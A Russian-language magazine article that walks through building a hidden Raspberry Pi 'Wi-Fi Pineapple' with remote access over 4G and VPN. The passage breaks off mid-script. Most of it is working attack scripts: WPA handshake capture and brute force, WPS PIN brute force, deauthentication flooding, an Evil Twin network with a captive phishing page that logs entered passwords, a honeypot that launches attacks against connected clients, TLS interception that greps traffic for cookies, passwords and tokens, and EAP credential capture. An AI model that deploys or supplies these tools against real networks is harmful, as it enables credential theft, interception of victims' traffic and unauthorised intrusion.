Ак кумуля тор 3,7 В, расположенный сни зу, через повышающую пла ту DC-DC
MT3608 подает 5 В на второй и девятый пины GPIO. Также к пре образова-
телю нап ряжения под паян внешний Micro-USB для удобной зарядки акку-
мулятора и тумблер подачи питания от аккумулятора. Тем не менее у Raspber-
ry есть два собственных USB-порта, значит, всег да есть воз можность исполь-
зовать обыч ный powerbank. Схема подключения к пла те све тодиодов, перек-
лючателей, а также подводки питания представлена на сле дующем рисунке.





      Схема размещения на плате светоди одов, перемычек и питания

Ис поль зование дисплея может быть расточительно с точки зре ния экономии
аккумулятора, поэтому для индикации про цесса лучше использовать три све-
тоди ода. Прин цип управления поведением све тоди одов описан в статье
про BadUSB-ETH.
  Для авто матического старта тех или иных сценариев задействовано шесть
положений перемычек (их прог раммная обра ботка опи сана ниже) и две точки
подачи нап ряжения — 5 и 3,3 В. Также вось мой и десятый пины — это точки,
на которых с помощью UART-переходника всегда можно открыть шелл
на Pineapple-устрой стве.
   Те перь к самому главному — Wi-Fi-адаптеру. Режим монитора встроенной
Wi-Fi-карты недос тупен «из короб ки», но воз можен на спе циальной прошив-
ке, и для его акти вации требуется соб рать новое ядро:


wget -O re4son-kernel_current.tar.xz https://re4son-kernel.com/
download/re4son-kernel-current/
tar -xJf re4son-kernel_current.tar.xz
cd re4son-kernel_4*
sudo ./install.sh

Пос ле дол гой уста новки появится дополнительный файл про шив ки для Wi-Fi-
чипа. Через этот файл реали зуется режим монито ра:


md5sum /lib/firmware/brcm/brcmfmac43430-sdio.*
bae7f1ba1b64cb19bb0c5433a3940405  /lib/firmware/brcm/brcmfmac43430-
sdio.bin.monitor
54f6af2776997cb1ee06edf2b93ab815  /lib/firmware/brcm/brcmfmac43430-
sdio.bin.original

Что бы переключиться меж ду прошивками, можно перезагрузить драй вер
и пере именовать файл про шивки:


rmmod brcmfmac
cp brcmfmac43430-sdio.bin.original brcmfmac43430-sdio.bin
modprobe brcmfmac

Ре жим монито ра акти вируется в стиле mac80211-стека:


iw phy0 interface add mon0 type monitor
ifconfig mon0 up
airodump-ng mon0

Возможность автоном но выполнять самые популярные Wi-Fi-ата ки теперь
обеспечена. Тем не менее с Raspberry всегда можно использовать любой
внешний Wi-Fi-адаптер и дополнительные антенны. Правда, непримет ность
от это го может пос традать. Слож ные атаки не так просто автоматизировать.
И потенциальному зло умышленни ку может быть на руку удаленное управле-
ние таким девай сом.
  Дос таточно легко сделать так, что бы подобный Pineapple был всегда дос-
тупен злоумыш ленни ку при помощи любого 4G-модема. Современный 4G-
модем реализует ся  как виртуальная сетевая кар та (уже знакомая нам
по статье о BadUSB-ETH), что максимально упрощает взаимодействие
Pineapple с ним. Для это го достаточно активировать сетевой интерфейс
модема:


/etc/network/interfaces
allow-hotplug eth0
auto eth0
iface eth0 inet dhcp

Для удален ного доступа к Pineapple требуется настроить авто запуск VPN
до сервера, используемо го зло умышленником в качес тве опорной точки:


cp your_vds.ovpn /etc/openvpn/client/vds.conf
systemctl enable openvpn-client@vds

Уп равлять непосредственно самим Pineapple про ще все го по SSH:


systemctl enable ssh.service

Те перь злоумыш ленник может поместить такое устрой ство в любое мес то,
где принимается сигнал ата куемых точек дос тупа или есть много потенциаль-
ных жертв для атак Evil Twin. При этом можно управлять Pineapple с ноутбука,
сидя где-нибудь в комфор тном и безопасном месте.





                   Pineapple с удаленным доступом по 4G

Нап ример, исполь зуя VPN-канал по 4G, зло умыш ленник может прос то рас-
шарить по сети беспроводной mon-интерфейс Pineapple и реализовы вать
все Wi-Fi-ата ки со сво его ноут бука:


pineapple> airserv-ng -p 1337 -d mon0
attacker> airodump-ng -c 1,6,11 pineapple:1337




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





              СОБИРАЕМ И ПРИМЕНЯЕМ СВОЙ WI-FI
                                         PINEAPPLE




Ес ли 4G-канал недос тупен, для настройки атак в авто номном режиме всегда
можно под ключиться к плате и получить консоль через UART, как продемонс-
трировано на следующем рисун ке.





                  Прямое под клю чение к Pineapple


sudo minicom -D /dev/ttyUSB0 -b 115200 --color= on

Далее уже в при вычном шелле, работая с ОС девайса, можно выполнить тон-
кую настройку сце нария ата ки.
  Зачастую в таком виде устройство завершает работу ОС некоррек тно,
нап ример если разрядился аккумулятор. Поэтому, чтобы на устройстве
не про пали важные данные, рекомен дуется отклю чить дисковый кеш:


/etc/fstab
PARTUUID=067e19d7-02 / ext4 defaults,noatime,sync 0 1

Под клю чаться к плате по UART или 4G весьма удобно, но в некоторых случаях
злоумышленнику может потребоваться сра зу начать выпол нять атаки. Быстро
запустить пре дустановленные сценарии, ориенти рованные на широкий круг
целей, поз волит джампер (перемычка) на GPIO. Отслеживать положе ние
джампера на программной сто роне можно так:


/usr/local/bin/jmp
#!/bin/bash
exit $(raspi-gpio get $1 | awk '{print $3}' | cut -d '=' -f 2)

Те перь, меняя положе ние джампера непосредственно перед вклю чением
Pineapple, злоумыш ленник указывает запуск, нап ример, вектора Evil Twin или в
другом положе нии — мас совую  деаутен тифика цию и сбор  handshake
(рукопожатия при аутентификации). Что и в каком случае использовать, зада-
ется в скрипте авто запус ка:


/home/pi/startup.sh
#!/bin/bash


function monitor_enable(){
  iw phy0 interface add mon0 type monitor
  ifconfig mon0 up
  ifconfig wlan0 up
}


raspi-gpio set 7 ip pu
raspi-gpio set 10 ip pu
raspi-gpio set 11 ip pu
raspi-gpio set 23 ip pu
raspi-gpio set 25 ip pu
raspi-gpio set 27 ip pu
cd /home/pi/
time=$(date +'%H:%M:%S_%d.%m.%Y')


led green on 2> /dev/null
led yellow on 2> /dev/null
led red on 2> /dev/null
sleep 1
led green off 2> /dev/null
led yellow off 2> /dev/null
led red off 2> /dev/null


if jmp 7; then
  echo "[*] wpa auth/deauth/online_brute attack (static/dynamic)"
  monitor_enable
  cd wpapsk
  screen -dmS wpapsk -t monitor -L -Logfile "$time-wpapsk-%n.log" ./
monitor.sh -c 1,6,11
  #screen -r wpapsk -t deauth -X screen ./deauth.sh -b target.txt
  screen -r wpapsk -t brute-wpapsk -X screen ./brute-wpapsk.sh
  screen -r wpapsk -t auth -X screen ./auth.sh
  screen -r wpapsk -t brute-pmkid -X screen ./brute-pmkid.sh
  screen -r wpapsk -t online_brute -X screen ./wpa_brute.sh "Target
Wi-Fi" passwords.txt 4
  #screen -r wpapsk -t online_brute -X screen './wpa_brute-width.sh
12345678 123456789 1234567890 password'
  cd -
elif jmp 11; then
  echo "[*] wps attack (static/dynamic)"
  cd wpapsk
  screen -dmS wpapsk -t wps -L -Logfile "$time-wps-%n.log" ./wps.sh
"Target Wi-Fi"
  cd -
elif jmp 10; then
  echo "[*] roqueap/eviltwin attack (static)"
  #monitor_enable
  cd eviltwin
  ifconfig wlan0 10.0.0.1/24
  iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j
REDIRECT --to-ports 80
  screen -dmS eviltwin -t hostapd -L -Logfile "$time-eviltwin-%n.log"
 ./hostapd.sh "Corp Wi-Fi" ""
  screen -r eviltwin -t dnsmasq -X screen ./dnsmasq.sh
  screen -r eviltwin -t captive -X screen ./captive.sh www/
  #screen -r eviltwin -t deauth -X screen ./deauth.sh -c 1,6,11
  cd -
elif jmp 23; then
  echo "[*] roqueap/honeypot (static)"
  cd honeypot
  ifconfig wlan0 10.0.0.1/24
  screen -dmS honeypot -t hostapd -L -Logfile "$time-honeypot-%n.log"
 ./hostapd.sh "Free Wi-Fi" ""
  screen -r honeypot -t dnsmasq -X screen ./dnsmasq.sh
  screen -r honeypot -t attack -X screen ./attack.sh
  cd -
elif jmp 25; then
  echo "[*] roqueap/eap (static)"
  cd eap
  screen -dmS eap -t hostapd-eaphammer -L -Logfile "$time-eap-%n.log"
 ./hostapd-eaphammer.sh "Target Wi-Fi"
  #screen -r eap -t deauth -X screen ./deauth.sh -c 1,6,11
  cd -
cd -

Ход и результаты атак сохраня ются в соответствующие файлы на карте
памяти Pineapple, с наз вани ем, отра жающим тип, дату и время атаки. Этот
скрипт сле дует лишь добавить в автозагрузку:


/etc/rc.local
/bin/bash /home/pi/startup.sh &

В скрипте startup.sh тезисно описаны все ата ки, которые рас сматрива ются
в этой статье.


ÀÒÀÊÈ ÍÀ WI-FI

При опи сании атак на Wi-Fi, да и радиоатак вооб ще, стоит сра зу сделать ого-
вор ку,  какие  ата ки целесообразны  в исполнении  Pineapple.  Pineapple
не единствен ный девайс, способный ата ковать по ради оканалу, и часть атак я
сознательно не рассматриваю в этой статье, так как некоторые из них разум-
нее про водить, нап ример, с телефо на.
   Разнооб разных атак на Wi-Fi предос таточно, и в этой статье описаны лишь
те атаки, которые требуют дли тельного участия ата кующе го. Форм-фактор
ата кующе го устройства идеально подходит для скры того длительного раз-
мещения вблизи атакуемых объектов — точек дос тупа, их пользовате лей
и самих кли ентских устройств, IP-камер и прочих. А све тоди оды информируют
о статусе атаки без подклю чения к плате. Так мож но понять, выпол нил ли
Pineapple свою работу, или зло умышленнику стоит вернуть ся за ним позже.
   Те перь рассмотрим каж дую из основных атак на Wi-Fi, которые тезисно
описаны выше:
 • WPA Handshake/bruteforce (атака на аутен тифика цию точки доступа);
 • WPS (атака на аутентификацию точки дос тупа);
 • Evil Twin (атака на действия пользователей);
 • EAP Attack (атака на аутентифика цию кли ентских устройств);
 • Honeypot (атака на ОС клиентских устройств).


Çàõâàò õåíäøåéêà WPA
Зах ват WPA Handshake — одна из самых популярных и широко при меняемых
атак. WPA Handshake переда ется кли ентом во втором сообщении (EAPOL M2)
четырехсту пенчатого рукопожатия.
  Содержимое это го пакета слу жит доказательством для точки доступа, что
клиент знает общий ключ PSK. Злоумыш ленник же, перехватив такой хеш,
может подоб рать пароль перебором по сло варю. Для захвата хеша ата-
кующему необязательно совершать активные действия. Посколь ку в его рас-
поряжении  есть  техническое средство, спо собное долго и незаметно
находиться в зоне действия целевых беспро водных сетей, он может просто
пассивно ждать передачи handshake, ведь такая ата ка абсолютно «бес-
шумна».


wpapsk/monitor.sh
#!/bin/bash


dumpfile= out-$(date +'%H:%M:%S_%d.%m.%Y')
screen -dmS airodump airodump-ng mon0 -w $dumpfile $*
while sleep 10:
do
  hcxpcapngtool "${dumpfile}-01.cap" -o /tmp/eapol.txt --all
  hcxhashtool -i /tmp/eapol.txt --authorized -o /tmp/eapol_valid.txt
  hcxhash2cap --pmkid-eapol=/tmp/eapol_valid.txt -c /tmp/out-m1m2.
pcap


  if echo 0 | aircrack-ng "/tmp/out-m1m2.pcap" | grep 'handshake' |
grep -q -v '0 handshake'; then
    led yellow on 2> /dev/null
  fi


  rm -f /tmp/eapol.txt
  rm -f /tmp/eapol_valid.txt
  rm -f /tmp/out-m1m2.pcap
done
screen -XS airodump quit

Мониторя беспроводные сети, этот скрипт на ука занных частотных каналах
каждые десять секунд проверяет, не зах вачен ли handshake. Как только
Pineapple захватит его, загорится желтый светодиод. Стоит упомянуть, что
есть вероятность захвата невалид ного пароля, который так же отправляется
в виде handshake-пакета. Но handshake с таким паролем не содержит отве та
от точ ки доступа (EAPOL M3) и счи тается половинчатым (Half-handhake). Что-
бы не получить ложного срабаты вания, скрипт отбрасывает такие handshakes
и оставляет толь ко те, которые содержат подтвержде ние, а зна чит, с правиль-
ным паролем.
   Чтобы ускорить сбор handshake, можно подклю чить активную составля-
ющую — рассылку пакетов деаутентифика ции. Она отправляет от имени кли-
ента и точки дос тупа всем слы шимым клиентам Wi-Fi-сетей спе циальные
пакеты,  закрывающие соединение  (деаутен тифика ция). Кли ент, который
на самом деле не собирался отклю чать ся от точки дос тупа, выполнит пов-
торное под клю чение, передав хеш пароля к этой сети.


wpapsk/deauth.sh
#!/bin/bash


mdk4 mon0 d $* | while read line
do echo $line
    led green on 2> /dev/null
    sleep '0.1'
    led green off 2> /dev/null
done

Процедура деаутентификации ведомая — она не переключает на устройстве
частотные каналы самос тоятельно, а следует за ведущим процессом moni-
tor.sh, выполняющим эту работу. Все, что мож но допол нительно сообщить
скрип ту, — список MAC-адресов атакуемых беспроводных сетей. Также
в момент отправ ки деаутентификации Pineapple мига ет зеленым светоди-
одом.
  Деаутентификация имеет негативные побоч ные воздействия на атакуемую
сеть — пос тоянно отклю чаются клиенты, поэтому запуск скрипта закомменти-
рован в скрип те startup.sh и при веден как опциональный.
  Во время охо ты за handshake, опять же опци онально, устройство может
про верить при нятые handshake самыми слабыми паролями по сло варю.
Переби рать боль ше 1000 вариантов не стоит, ина че быстро сядет аккумуля-
тор. И если пароль подобран, загора ется красный светоди од.


wpapsk/brute-wpapsk.sh
#!/bin/bash


while sleep 60:
do
  for pcap in * .cap
  do echo $pcap


    hcxpcapngtool "$pcap" -o /tmp/eapol.txt --all
    hcxhashtool -i /tmp/eapol.txt --authorized -o /tmp/eapol_valid.
txt
    hcxhash2cap --pmkid-eapol=/tmp/eapol_valid.txt -c /tmp/out-m1m2.
pcap


    for bssid in $(echo 0 | aircrack-ng "/tmp/out-m1m2.pcap" | grep
'handshake' | grep -v '0 handshake' | awk '{print $2}')
    do
      if [ -f "/tmp/$bssid" ]; then
        continue
      fi
      touch "/tmp/$bssid"
      aircrack-ng -w /home/pi/wpapsk/passwords_top1k.txt -b "$bssid"
"/tmp/out-m1m2.pcap" -l "$bssid.txt"
      if [ -s "$bssid.txt" ]; then
        led red on 2> /dev/null
        exit
      fi
    done


    rm -f /tmp/eapol.txt
    rm -f /tmp/eapol_valid.txt
    rm -f /tmp/out-m1m2.pcap


  done
done

Для успеха злоумышленнику нуж но на некоторое вре мя незаметно поместить
Pineapple в зону пок рытия интересующих его Wi-Fi-сетей. И далее требуется
глав ным образом просто наб рать хешей, а серь езный брутфорс может быть
выполнен позднее на более мощ ном обо рудовании.


Áðóòôîðñ WPS
Ата ка под бора PIN-кода WPS — еще один пример атаки на точку дос тупа Wi-
Fi, тре бующей длительного вре мени. Беспроводных устройств с активным
и под вержен ным перебору WPS дос таточно много — от тех же беспро водных
принтеров до кор поративных точек доступа. Если точка доступа не име ет
некий дефол тный PIN либо неуязвима к Pixie Dust, позволяюще му подобрать
PIN-код за несколько попыток (секунд), полный перебор всего пространства
PIN-кодов  в  худшем  из  сценариев  для  злоумышленника  потребу-
ет 11 000 попыток. Хорошо, если каж дая из попыток пройдет хотя бы
за секунду. В результате в иде аль ном случае, если точка дос тупа его не заб-
локирует, на эту атаку может потребовать ся несколько часов. Находиться
воз ле ата куемой точ ки так долго с ноутбуком или телефоном неразум но, ведь
про цесс полностью авто мати зиро ван и учас тие человека не тре бует ся —
нужен толь ко Pineapple.


wpapsk/wps.sh
#!/bin/bash


function attacks(){
    AP="$1"
    sudo reaver -i mon0 -b "$AP" -F -w -N -d 2 -l 5 -t 20 -vv -K
    sudo reaver -i mon0 -b "$AP" -F -w -N -d 2 -l 5 -t 20 -vv
}


if echo "$1" | grep -q -E '^\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2}$';
then # BSSID
    attacks "$1"
else # ESSID
    for AP in $(sudo wash -i mon0 -s | fgrep "$1" | awk '{print $1}')
    do echo "$AP"
        attacks "$AP"
    done
fi

Цели для атаки мож но задать как по MAC-адре су точ ки дос тупа, так и по име-
ни беспро водной сети. Скорее всего, злоумышленник будет располагать
лишь име нем сети. Впро чем, у средних и круп ных компаний на одно и то же
имя может при ходить ся множество точек доступа. Этот скрипт переби рает
PIN-коды на каждой точке.


Evil Twin
Ата ка «злой двойник»  (Evil  Twin) — это ими тация бес проводной  сети,
к которой уже есть доверие. И доверие в этом случае у пользователей. Evil
Twin — бес про вод ная соци альная атака, беспро водной фишинг, нап равлен-
ный именно на людей, а не на кли ентские устройства.
   Так как не на все Wi-Fi-сети можно выполнить ранее описанные атаки
и подобрать пароль злоумышленнику тоже удается далеко не всегда, можно
спро сить этот пароль у самих пользователей, которые час то оказываются
самым слабым зве ном периметра. В этом случае устройство Pineapple может
работать как точка доступа Wi-Fi с тем же име нем сети, что и атакуемая. С той
лишь разницей, что сеть открытая. Ата ка полага ется на доверие пользователя
к подставной сети. Предполага ется, что имен но пользователь намеренно
под клю чится к будто бы легальной беспро водной сети и введет пароль,
который отправится прямо к зло умышленни ку в открытом виде.
   Чтобы повысить веро ятность того, что кто-то из пользователей подключит-
ся к подставной сети, устройство Pineapple точно так же, как и в прошлый раз,
может отправлять пакеты деаутен тифика ции, отклю чая все клиенты от ата-
куемой беспроводной сети.
  Для успешнос ти атаки  Evil Twin злоумышленни ку требуется грамотно
решить две задачи: запустить беспро водную сеть с име нем, которое точно
привлечет внимание людей, и, конечно же, устроить толковый претек стинг
Captive-портала. В скрип те startup.sh прописаны компоненты, формиру-
ющие эту атаку. Первый ком понент — это точка доступа. Скрипт запус ка точки
доступа выг лядит следующим обра зом:


eviltwin/hostapd.sh
#!/bin/bash


essid="$1"
password="$2"


if [ -z "$password" ]; then
    config='hostapd-opn.conf'
else
    config='hostapd-wpa.conf'
fi


cp $config /tmp/$config
sed -i "s/__ESSID__/$essid/g" /tmp/$config
sed -i "s/__PASS__/$password/g" /tmp/$config


hostapd /tmp/$config | while read line
do
    if echo "$line" | fgrep -q 'AP-STA-CONNECTED'; then
        led green on 2> /dev/null
    elif echo "$line" | fgrep -q 'AP-STA-DISCONNECTED'; then
        led green off 2> /dev/null
    fi
done

Как толь ко к Pineapple подключится кли ент, загорит ся зеленый све тоди од.
  Шаб лон конфигурационного фай ла для открытой бес провод ной сети выг-
лядит так:


eviltwin/hostapd-opn.conf
interface=wlan0
driver=nl80211
ssid=__ESSID__
hw_mode= g
channel= 1
macaddr_acl= 0
auth_algs= 1
ignore_broadcast_ssid= 0

Второй ком понент — скрипт запуска DHCP-сервера:


eviltwin/dnsmasq.sh
#!/bin/bash


dnsmasq --conf-file=dnsmasq.conf -d | while read line
do
    if echo "$line" | fgrep -q 'DHCPACK'; then
        led yellow on 2> /dev/null
    fi
done

Жел тый све тодиод сигнализирует, что клиент получил IP-адрес и начал поль-
зоваться такой беспро водной сетью. Кон фигура ция предлагаемой сети
при этом сле дующая:


eviltwin/dnsmasq.conf
domain=pineapple.local
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.20,24h
dhcp-option=1,255.255.255.0
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1


local-ttl= 30
address=/#/10.0.0.1

Стоит заметить, что популярная прог рамма dnsmasq — это не только DHCP-
сервер, но и DNS-сер вер. Причем сервер, работающий в весь ма хакер ском
стиле: в последней стро ке ему отдается коман да резолвить любой DNS-зап-
рос от жертвы IP-адре сом Pineapple. Так абсолютно все запросы обращают ся
в атакующее устройство.
   Чтобы мимо хакерского устройства не про шел ни один HTTP-запрос,
с помощью iptables заворачивается весь веб-тра фик от клиентов на Pineapple
на уровне сети:


iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT
--to-ports 80

Настала очередь треть его, самого главного зве на атаки — небольшого Cap-
tive-портала,  реализован ного  через  встро енный  в  интерпре татор PHP
веб-сервер:


eviltwin/captive.sh
#!/bin/bash


php -S 10.0.0.1:80 captive.php $* | while read line
do echo $line
    if echo "$line" | fgrep -q "password"; then
      led red on
    fi
done

Ре ализовать веб-сер вер проще, наверное, уже нельзя. Если пользователь
вве дет пароль, то Pineapple оповестит об этом крас ным светодиодом. Обра-
баты вает все запросы скрипт captive.php:


eviltwin/captive.php
<?php
$root = str_getcsv(file_get_contents('/proc/self/cmdline'), "\0")[4];
$script = str_replace('..', '', urldecode($_SERVER['SCRIPT_NAME']));
// safety
header('HTTP/1.1 200 OK');
header('Content-type: '); // disable Content-Type
if ( is_file($root . $script) )
    echo file_get_contents($root . $script);
else
    echo file_get_contents($root . "/index.html");


foreach($_POST as $par=>$val)
    error_log( "\x1b[31m" . "$par: $val" . "\x1b[0m" );
?>

Правильная реали зация Сaptive-портала — очень важный и тонкий момент.
Как правило, современные браузеры практичес ки ничего не отправляют
по открытому HTTP-про токолу, а во многих браузе рах поддержка этого про-
токо ла и вовсе отклю чена. Но Captive-портал — это общепринятый механизм,
огра ничи вающий дос туп в интернет с открытых беспро водных сетей, поэтому
все современные ОС сразу пос ле под ключения про веряют наличие Captive-
пор талов, отправ ляя специальный HTTP-запрос. Если в этот момент не дать
понять атакуемой сто роне, что Captive-портал существует, — атака сорвется.
Для этого нужно возвращать клиенту HTTP-ответ с кодом 200 и непус тое
содержимое страницы, даже если запрос делается на несущес твующий
ресурс. В случае успе ха система автоматичес ки отображает пользователю
фишин говую стра ницу, выпыты вающую те или иные данные.
   Captive.php — лишь мини атюрная обер тка между запросами  кли-
ентов-жертв и веб-страниц, которые они видят. Сей час веб-страницы дос-
таточно сложны, и верстать их с нуля не самое гениальное решение. Вместо
этого мож но сох ранить любую веб-стра ницу аутентификации браузе ром
и ско пировать все файлы в eviltwin/www/. Таким образом можно обрабаты-
вать любые HTTP-запросы единым PHP-скриптом и во время атаки мак-
симально абстра гироваться от кодинга.
   Так как дан ные с веб-форм почти всегда отправ ляют ся по HTTP методом
POST, все подобные зап росы будут сох ранены. А если сре ди таких запросов
есть параметр password, то captive.sh отреагирует на это красным све-
тоди одом.
  Вве денные пользовате лем данные подсве чены красным цве том в тер-
минале, что бы мож но было видеть ста тус и при уда ленном под ключении
по 4G.
   Весь вывод от всех скрип тов также сохраня ется на карте памяти Pineapple.
Пос коль ку атака Evil Twin социальная, то под каж дую конкретную ситу ацию
может пот ребовать ся верс тка своего вари анта оформле ния стра ницы Cap-
tive-портала. Злоумыш ленник необязательно должен запрашивать пароль
от конкрет ной точки доступа. Жертвам может быть пред ложена любая
веб-форма, хоть от соц сетей, хоть от любого дру гого сайта. Главное — убе-
дить пользователя ввести туда те данные, которые зло умышленник нацелен
получить. Да и необязательно ими тиро вать легитим ную сеть, важ но ведь
заин тересовать этой сетью пользователя, это может быть хоть «Free Wi-Fi».
  Последний,  но  не  обя затель ный  штрих —  отключение  клиентов
от легитим ной сети (логичес кое глушение сигнала):


eviltwin/deauth.sh
#!/bin/bash


mdk4 mon0 d -w <(getmac -i wlan0) $* | while read line
do echo "$line"
done




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





              СОБИРАЕМ И ПРИМЕНЯЕМ СВОЙ WI-FI
                                         PINEAPPLE




Во время атаки  Evil Twin с глушением сиг нала легитимных точек важно
не «выстре лить себе в ногу» и исключить из спис ка целей фишинговую бес-
про вод ную сеть.
   Атака Evil Twin именно социальная, то есть требует непосредственных дей-
ствий поль зовате ля. И социальная она, как пра вило, в двух смыслах.
   Во-первых, поль зователь сам должен выбрать под став ную сеть для под-
ключения, пос коль ку кли ентское устройство само не перепод ключится с зак-
рытой сети на откры тую, даже если имя под став ной сети в точности соответс-
твует легитимной. Лишь у ста рых ОС и на старых устройствах была такая
неразборчи вость, когда сеть могла автоматически смениться с WPA на OPN
при наличии оди нако вого имени.
   Во-вторых,  учетные данные за пользователя тоже никто не введет.
Как толь ко такой пользователь най дется, при откры тии любой веб-страницы
ему навязчиво будет предложено ввести пароль, который при нимается уже
откры тым текстом и сох раняется в устройстве Pineapple.
   Атака Evil Twin может быть эффективна на режимных объектах со строгими
правила ми, где «изголодавшиеся по интернету» сотрудники готовы на мно-
гое, в том числе и ввести любые данные ради дос тупа к сети. Там злоумыш-
ленник, сыграв на слабос тях человека, впол не может раздобыть и доменную
учетку, и все на свете, с чем он потом уда ленно зайдет в чью-то поч ту
или под ключится по VPN во внут реннюю сеть.


Õàíèïîò
Нечто похожее на Evil Twin может быть развито в другую ата ку, но с прицелом
уже на кли ент ские устройства, а не пользователей.
  В предыдущем раз деле, ког да к Pineapple подклю чает ся поль зователь, его
лишь скром но просят ввести конфиденциаль ные данные. Но можно пос тупить
про ще. Что, если компьютер поль зователя уяз вим или на вход в систему сто-
ит слабый пароль? И что, если в комп в момент его подключения к «злой»
беспроводной сети вставлен кабель, соеди няющий с локальной сетью? Тогда
путь проникновения может быть для злоумыш ленника еще более лег ким.
  Сце нарий нападе ния «Honeypot» использует те же самые механизмы
запуска точки доступа hostapd.sh и раздачи IP-адре сов dnsmasq.sh, что и у
Evil Twin. Но далее сценарий развивается аналогично BadUSB-ETH. Сразу
пос ле стар та беспроводной сети запускаются глобальные атакующие скрип-
ты, а как только появляется клиент с IP-адресом, на него автоматически идет
шквал таргетированных атак:


honeypot/attack.sh
#!/bin/bash


HOME='/home/pi'


screen -dmS Xorg xinit -- /usr/bin/X :0 -br # optional for GUI
attacking script
rm /tmp/honeypot_attacks.txt 2> /dev/null


for script in $(find on_network/ -type f -perm -u+x)
do
  exec sudo $script wlan0 "" &
done


while sleep 1
do
  arp -an | sed -rn 's/\? \(([^\)]+)\) .*\[ether\] on wlan0/\1/p' |
while read ip
  do
    egrep -q "^$ip$" /tmp/honeypot_attacks.txt 2> /dev/null &&
continue || echo "$ip" >> /tmp/honeypot_attacks.txt
    for script in $(find on_client/ -type f -perm -u+x)
    do
      exec $script $ip "" 10.0.0.1 &
    done
  done
done

Скрипт запускает атаки снова и сно ва для вновь подключившихся клиентов.
Тут исполь зуется атакующий арсенал скриптов, уже описанный в статье
о BadUSB-ETH. В дополнение к тому, что уже описано, а это и атаки на Net-
BIOS-зап росы, и подмена содержимого веба, и кража cookies, может быть
добавлено еще многое. Нап ример, вме шатель ство в HTTPS-тра фик жертв,
под клю чившихся к под ставной точке доступа. Для этого нуж но завернуть
на себя 443/TCP-порт и при под ключении внедрить самоподписанный сер-
тификат. Если в перех ваченном трафике встре чаются чувс твитель ные данные,
то в логах такая стро ка выделяется цветом, а на устройстве загора ется жел-
тый све тодиод:


honeypot/on_network/sslsplit.sh
#!/bin/bash


echo '[*] SSL splitting'


[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 443) = '' ]]
&& {
    iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 443 -j
REDIRECT --to-ports 1080
}


[[ $(pgrep /usr/bin/socat) = '' ]] && {
    if [ ! -s /tmp/key.pem -o ! -s /tmp/cert.pem -o ! -s /tmp/cert_
key.pem ]; then
        openssl req -new -x509 -keyout /tmp/key.pem -out /tmp/cert.
pem -days 365 -nodes -batch
        cat /tmp/cert.pem /tmp/key.pem > /tmp/cert_key.pem
    fi


    #sslsplit -k /tmp/key.pem -c /tmp/cert.pem -l /tmp/con.log -L
sslsplit.log -P autossl 0.0.0.0 1080 &
    socat -v openssl-listen:1080,fork,cert=/tmp/cert_key.pem,cafile=/
tmp/cert.pem,verify=0 open:sslsplit.log,creat,append 2> /dev/null &
}


tail -n 0 -f sslsplit.log | while read line
do
    if echo "$line" | grep -ai -e cookie -e passw -e token --color=
auto; then
        led yellow on 2> /dev/null
    fi
done

В конце концов, в файле sslsplit.log лежит весь расшифрованный трафик,
доступный для даль нейшего изучения и поиска секретов уже вручную. Вооб-
ще, необя зательно подключившееся устройство ста нет переда вать данные
в зашиф рованном виде, вполне возможно, что будет исполь зован и обычный
HTTP:


honeypot/on_network/http.sh
#!/bin/bash


echo '[*] HTTP cleartext monitoring'


ngrep -d "$1" -i 'cookie|passw|token' 'port 80 or port 8080' 2>&1 > /
tmp/ngrep.log &


tail -n 0 -f /tmp/ngrep.log | while read line
do
    if echo "$line" | grep -v '^match:' | grep -ai -e cookie -e
passw -e token --color= auto;
      led yellow on 2> /dev/null
    fi
done

Ес ли какие-либо чувстви тельные дан ные переда ются по незащищенному
HTTP, это так же видно в логах выделенным цве том и по жел тому светодиоду
на устройстве. Зло умышленник может записать весь трафик кли ентов:


honeypot/on_network/tcpdump.sh
#!/bin/bash


echo '[*] writing trafic'
time=$(date +'%H:%M:%S_%d.%m.%Y')


tcpdump -i "$1" -nn -w "${time}.pcap"

Тут жертва никак не ограничивается в сво их дей ствиях, все попытки что-то
скачать по незащи щенному HTTP или сог ласить ся на самоподписанный сер-
тификат по HTTPS толь ко приветствуются ханипотом.
   Также персонально для каж дого под клю чив шегося клиента могут быть
использованы реализованные в статье про BadUSB-ETH скрипты:
 • on_client/ms17_010.sh ;
 • on_client/bruteforce/smb.sh ;
 • on_client/bruteforce/rdp.sh .

Возможные атаки отнюдь не огра ничиваются этим скромным спис ком и могут
быть значитель но рас ширены каждым зло умышленником инди виду ально
под ту или иную ситуацию.


Àòàêà EAP
Как я уже говорил, атака Evil Twin полностью социальная, с минимумом тех-
нических тре бова ний к атакуемым целям. Ата ка Honeypot (ханипот) — уже
боль ше с прицелом на технические уязвимости клиент ских устрой ств, а не
на слабос ти поль зовате лей, но все же требует от пользователя под ключить-
ся. EAP-атака пол ностью ориентирована на устрой ства.
  При EAP-атаке про исходит почти то же самое, что и в Evil Twin, где ими-
тируется легитимная точка доступа и ата куют ся ее кли енты, только атакуется
именно само устройство клиента — железка, а не человек. Это сводит к нулю
социаль ный фактор и не требует вообще никако го учас тия пользователя —
что называется zero click. Атака получается на 100% надежной и быс трой,
если под вержен ное этой ата ке устройство есть.
   Уяз вимость кроется в том, что само устройство автоматичес ки небезопас-
но передает учетные данные для под ключения к сети WPA Enterprise.
   Тре бует ся запустить немного пропатченную вер сию hostapd-wpe, сох-
раняющую более подробные логи при получе нии учетных данных, а также
предложить  клиентско му  устройству  список  методов  аутентификации
в обратном порядке — начиная с самого небезопас ного. И если кли ент сог-
ласится, пароль или хеш удастся перехватить:


eap/hostapd-eaphammer.sh
#!/bin/bash


essid="$1"


cp /opt/eaphammer/local/hostapd-eaphammer/hostapd/hostapd.conf /tmp/
hostapd-eaphammer.conf
sed -i "s/interface=.*/interface=wlan0/g" /tmp/hostapd-eaphammer.conf
sed -i "s/ssid=.*/ssid=$essid/g" /tmp/hostapd-eaphammer.conf
sudo /opt/eaphammer/local/hostapd-eaphammer/hostapd/hostapd-
eaphammer -x /tmp/hostapd-eaphammer.conf | while read line
do
    if echo "$line" | fgrep -q 'AP-STA-CONNECTED'; then
        led green on 2> /dev/null
